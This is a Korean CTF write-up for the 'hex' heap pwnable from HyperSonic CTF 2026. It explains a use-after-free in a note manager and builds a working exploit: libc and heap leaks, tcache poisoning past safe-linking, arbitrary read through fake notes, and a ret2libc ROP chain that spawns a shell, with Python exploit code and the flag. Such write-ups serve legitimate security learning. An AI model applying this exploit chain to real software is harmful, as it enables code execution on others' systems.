---
title: "HyperSonic CTF 2026 hex Writeup"
published: 2026-06-08
description: "HyperSonic CTF 2026 hex 문제 풀이."
category: "CTF/Wargame"
tags: ["HyperSonic CTF", "CTF", "Writeup", "Pwnable"]
draft: false
listed: false
---

***SSG Writeup***

# hex

## 개요

`hex`는 heap note manager 형태의 pwn 문제입니다. 프로그램은 `create`, `read`, `edit`, `delete` 메뉴를 제공하고, 최대 `16`개의 note 포인터를 전역 배열에 저장합니다.

확인한 조건은 다음과 같습니다.

- 카테고리: `pwnable`
- 보호 기법: PIE, Full RELRO, NX, stack canary
- 제공된 libc: glibc `2.43`
- 목표: heap UAF를 이용해 코드 실행 흐름을 `system("/bin/sh")`로 바꿉니다.

풀이에서 먼저 확인할 부분은 note가 heap chunk 안에 어떤 형태로 저장되는지입니다. `delete` 이후 포인터가 지워지지 않기 때문에, 해제된 chunk를 다시 `read`하거나 `edit`할 수 있습니다.

## 문제 분석

풀이에서 사용할 구조를 먼저 정리합니다.

- `notes[i]`: 전역 배열에 저장되는 note 포인터입니다.
- `note->size`: note chunk의 첫 `8`바이트에 저장되는 요청 크기입니다.
- `note->data`: `note + 8`부터 시작하는 사용자 데이터 영역입니다.
- `chunk_user`: glibc chunk에서 사용자 영역으로 반환된 주소입니다.
- `safe-linking`: tcache `fd`를 `next ^ (chunk_user >> 12)` 형태로 저장하는 보호 기법입니다.

`create_note`의 동작은 다음과 같이 정리할 수 있습니다.

```c
note = malloc(size + 9);
read(0, note + 8, size);
*(uint64_t *)note = size;
notes[idx] = note;
```

요청한 `size`는 chunk의 첫 `8`바이트에 저장되고, 실제 데이터는 `note + 8`부터 들어갑니다. `read_note`와 `edit_note`도 같은 구조를 사용합니다.

```c
// read_note
len = notes[idx]->size;
if (len > 0x300)
    len = 0x300;
write(1, notes[idx] + 8, len);

// edit_note
read(0, notes[idx] + 8, notes[idx]->size);
```

`read_note`는 출력 길이를 최대 `0x300`으로 제한하지만, `edit_note`에는 별도의 상한이 없습니다. 따라서 `note->size` 값을 크게 만들 수 있으면 `note + 8`부터 뒤쪽 chunk까지 덮을 수 있습니다.

취약점은 `delete_note`에서 발생합니다.

```c
free(notes[idx]);
```

`free` 이후 `notes[idx]`를 `NULL`로 만들지 않습니다. 인덱스 범위만 맞으면 해제된 note를 계속 읽고 수정할 수 있으므로 UAF가 생깁니다.

## 핵심 아이디어

해제된 chunk를 읽을 수 있으므로 먼저 allocator metadata에서 libc와 heap 주소를 얻습니다. 그다음 해제된 tcache chunk의 `note->size`가 safe-linking 값으로 바뀌는 점을 이용합니다.

작은 chunk가 tcache에 들어가면 사용자 영역 첫 `8`바이트에는 `fd`가 저장됩니다. 단일 entry의 경우 encoded NULL이 들어가므로 값은 대략 다음과 같습니다.

```text
note->size = chunk_user >> 12
```

프로그램은 이 값을 여전히 `note->size`로 해석합니다. stale note를 `edit`하면 매우 큰 길이로 `read`가 호출되고, 쓰기 시작 위치가 `note + 8`이므로 다음 chunk까지 overflow할 수 있습니다.

다만 자기 자신의 tcache `fd`는 `note + 0`에 있습니다. `edit`은 `note + 8`부터 쓰기 때문에 같은 chunk의 `fd`를 직접 바꾸기 어렵습니다. 대신 앞쪽에 있는 해제된 source chunk에서 overflow를 일으켜 바로 뒤에 있는 victim tcache chunk의 `fd`를 고칩니다.

사용한 배치는 다음과 같습니다.

```text
O  = overflow source chunk
V2 = victim tcache chunk
V1 = victim tcache chunk
```

해제 순서는 `O`, `V1`, `V2`입니다. 이때 victim 크기의 tcache list는 `V2 -> V1`이 됩니다. stale `O`를 수정하면서 `V2`의 header를 보존하고 `fd`만 다음처럼 바꾸면 됩니다.

```text
V2->fd = target ^ (V2_user >> 12)
```

이후 같은 크기로 두 번 할당하면 첫 번째는 `V2`, 두 번째는 `target`을 반환합니다. 이 동작으로 원하는 위치에 fake note를 만들고, 그 note를 읽거나 생성하면서 메모리를 읽고 쓸 수 있습니다.

## 풀이 과정

### Step 1. UAF로 libc 주소 누출

먼저 큰 note를 만들고 해제한 뒤 stale pointer로 읽습니다. 큰 chunk는 unsorted bin에 들어가며, 해제된 chunk의 metadata에는 libc 내부 포인터가 남습니다.

`read_note`는 `note + 8`부터 출력하므로 첫 `8`바이트에서 unsorted bin 포인터 하나를 읽을 수 있습니다. 분석한 환경에서 이 포인터는 libc base로부터 `0x212ac8` 떨어져 있었습니다.

```text
libc_base = leaked_unsorted_pointer - 0x212ac8
```

이 값으로 `environ`, `system`, `"/bin/sh"` 문자열, 필요한 ROP gadget 주소를 계산할 수 있습니다.

### Step 2. largebin metadata로 heap 주소 누출

libc base를 얻은 뒤에는 같은 stale chunk를 largebin으로 정렬시켜 heap 주소를 얻습니다. 큰 chunk를 해제한 상태에서 더 큰 chunk를 할당하면 기존 unsorted chunk가 bin 정렬 과정을 거치고, largebin의 `nextsize` 계열 포인터에 heap 주소가 남습니다.

stale read로 이 영역을 다시 읽으면 heap base를 계산할 수 있습니다. 이 값은 이후 tcache poisoning에서 `V2_user >> 12`를 정확히 계산하는 데 필요합니다.

### Step 3. source chunk overflow로 tcache poisoning 구성

다음 단계에서는 앞에서 정리한 `O`, `V2`, `V1` 배치를 만듭니다. `O`는 작은 크기로 만들고, `V2`와 `V1`은 같은 크기로 만듭니다.

```text
create(O)
create(V2)
create(V1)
delete(O)
delete(V1)
delete(V2)
```

`O`를 해제하면 `O`의 첫 `8`바이트 값이 safe-linked tcache 값으로 바뀝니다. 프로그램은 이 값을 `note->size`로 사용하므로 `edit(O)`는 `O + 8`부터 긴 데이터를 씁니다.

overflow payload는 `V2`의 chunk header를 망가뜨리지 않도록 맞춥니다.

```text
padding
prev_size = 0
size      = victim_chunk_size | 1
fd        = target ^ (V2_user >> 12)
```

이후 victim 크기로 두 번 할당하면 두 번째 할당 결과가 `target`이 됩니다. 이 과정을 반복해서 arbitrary read와 stack overwrite를 만듭니다.

### Step 4. fake note로 arbitrary read 만들기

프로그램의 `read_note`는 `notes[idx] + 8`부터 읽습니다. 따라서 어떤 주소 `addr`을 읽고 싶다면, tcache poisoning으로 `addr - 8`에 note 포인터를 만들면 됩니다.

```text
fake_note = addr - 8
read_note(fake_note) -> read from addr
```

먼저 libc의 `environ` 근처를 읽어 현재 stack 주소를 얻습니다.

```text
environ = libc_base + 0x219de8
```

그다음 `environ`에서 얻은 stack 주소 주변을 읽고, `read_note` 호출 뒤 `main`으로 돌아가는 saved return address를 찾습니다. 이 문제에서는 해당 반환 주소의 PIE offset이 `0x17a9`로 확인됩니다.

```text
saved_return_address = pie_base + 0x17a9
saved_rbp            = address_of_saved_return_address - 8
```

`saved_rbp`를 알면 `create`로 stack에 fake note를 할당했을 때 `saved_rbp + 8`부터 ROP chain을 쓸 수 있습니다.

### Step 5. saved RIP에 ret2libc chain 쓰기

마지막으로 tcache poisoning 대상 주소를 `saved_rbp`로 둡니다. `create`는 반환된 포인터의 첫 `8`바이트에 요청 크기를 쓰고, 입력 데이터는 그다음부터 씁니다.

stack frame 관점에서는 다음과 같이 맞아떨어집니다.

```text
saved_rbp      <- note->size
saved_rbp + 8  <- input_data[0:8]
```

따라서 입력 데이터의 첫 `8`바이트 값이 saved RIP가 됩니다. ROP chain은 간단한 ret2libc 형태로 구성했습니다.

```text
ret
pop rdi ; ret
"/bin/sh"
system
```

`ret` gadget은 stack alignment를 맞추기 위해 앞에 넣었습니다.

## Exploit / Solver

최종 exploit의 흐름은 다음과 같습니다.

```text
1. unsorted bin UAF read로 libc base를 구한다.
2. largebin metadata UAF read로 heap 주소를 구한다.
3. source chunk overflow로 tcache fd를 poisoning한다.
4. fake note를 이용해 `environ`과 stack window를 읽는다.
5. saved return address를 찾아 saved RBP를 계산한다.
6. 같은 poisoning 동작으로 saved RIP에 ROP chain을 쓴다.
```

아래 코드는 exploit의 핵심 루틴입니다. 메뉴 입출력 함수인 `create`, `read_exact`, `edit`, `delete`는 앞에서 분석한 프로그램 동작을 그대로 호출한다고 가정했습니다.

```python
LIBC_LEAK_OFF = 0x212AC8
ENVIRON_OFF = 0x219DE8
SYSTEM_OFF = 0x5C560
BINSH_OFF = 0x1DB799
RET_OFF = 0x289FE
POP_RDI_OFF = 0x11BCFA
READ_NOTE_RET_OFF = 0x17A9


def chunk_size(note_size):
    req = note_size + 9
    if req + 8 + 15 < 0x20:
        return 0x20
    return (req + 8 + 15) & ~0xF


def leak_bases(io):
    io.create(0, 0x500, b"A")
    io.create(1, 0x20, b"B")
    io.delete(0)

    libc_leak = u64(io.read_exact(0, 0x300)[:8])
    libc_base = libc_leak - LIBC_LEAK_OFF

    io.create(2, 0x600, b"C")
    largebin = io.read_exact(0, 0x300)
    heap = u64(largebin[8:16])

    io.create(0, 0x500, b"D")
    top = heap + chunk_size(0x500) + chunk_size(0x20) + chunk_size(0x600)
    return libc_base, heap, top


class Exploit:
    def __init__(self, io, top):
        self.io = io
        self.top = top
        self.next_idx = 3
        self.poison_no = 0

    def next_source_size(self):
        sizes = [1, 0x20, 0x60, 0xA0, 0xC0, 0xE0, 0x100]
        size = sizes[self.poison_no]
        self.poison_no += 1
        return size

    def poison_alloc(self, target, note_size, data=b"Z"):
        o = self.next_idx
        v2 = self.next_idx + 1
        v1 = self.next_idx + 2
        fake = self.next_idx + 3
        self.next_idx += 4

        o_size = self.next_source_size()
        o_csize = chunk_size(o_size)
        victim_csize = chunk_size(note_size)
        v2_user = self.top + o_csize + 0x10
        self.top += o_csize + victim_csize * 2

        self.io.create(o, o_size, b"O")
        self.io.create(v2, note_size, b"V")
        self.io.create(v1, note_size, b"W")
        self.io.delete(o)
        self.io.delete(v1)
        self.io.delete(v2)

        encoded = target ^ (v2_user >> 12)
        payload = b"A" * (o_csize - 0x18)
        payload += p64(0)
        payload += p64(victim_csize | 1)
        payload += p64(encoded)
        self.io.edit(o, payload)

        self.io.create(v2, note_size, b"Q")
        self.io.create(fake, note_size, data)
        return fake

    def read_memory(self, addr, size):
        fake = self.poison_alloc(addr - 8, size)
        return self.io.read_exact(fake, size)

    def leak_environ(self, libc_base):
        data = self.read_memory(libc_base + ENVIRON_OFF - 0x10, 0x40)
        return u64(data[0x10:0x18])

    def find_saved_rbp(self, stack_addr):
        start = (stack_addr - 0x408 - 8) & ~0xF
        data = self.read_memory(start + 8, 0x300)

        for off in range(0, len(data) - 8, 8):
            value = u64(data[off:off + 8])
            if (value & 0xFFF) != (READ_NOTE_RET_OFF & 0xFFF):
                continue

            pie_base = value - READ_NOTE_RET_OFF
            if pie_base & 0xFFF:
                continue

            ret_slot = start + 8 + off
            return ret_slot - 8, pie_base

        raise RuntimeError("saved return address not found")

    def write_rop(self, libc_base, saved_rbp):
        chain = b"".join([
            p64(libc_base + RET_OFF),
            p64(libc_base + POP_RDI_OFF),
            p64(libc_base + BINSH_OFF),
            p64(libc_base + SYSTEM_OFF),
        ])
        self.poison_alloc(saved_rbp, 0x80, chain)
```

입출력에서는 `scanf("%d")`와 `read`가 섞여 있습니다. 숫자와 바이너리 payload를 한 번에 보내면 숫자가 아닌 첫 바이트가 stdio buffer에 남을 수 있습니다. 그래서 숫자 입력은 줄 단위로 보내고, `data>` prompt를 받은 뒤 payload를 보내야 안정적으로 동작했습니다.

## 결과

로컬 검증에서는 ROP chain 실행 뒤 셸 명령 결과로 `LOCAL_SHELL_OK`가 출력되는 것을 확인했습니다. 원격 실행 기록에서 확인한 flag는 다음과 같습니다.

```text
hs{92b7694d7d47a73a79e554f823e88d8a70754d86d10b00cc7d5e4b9728607d26}
```
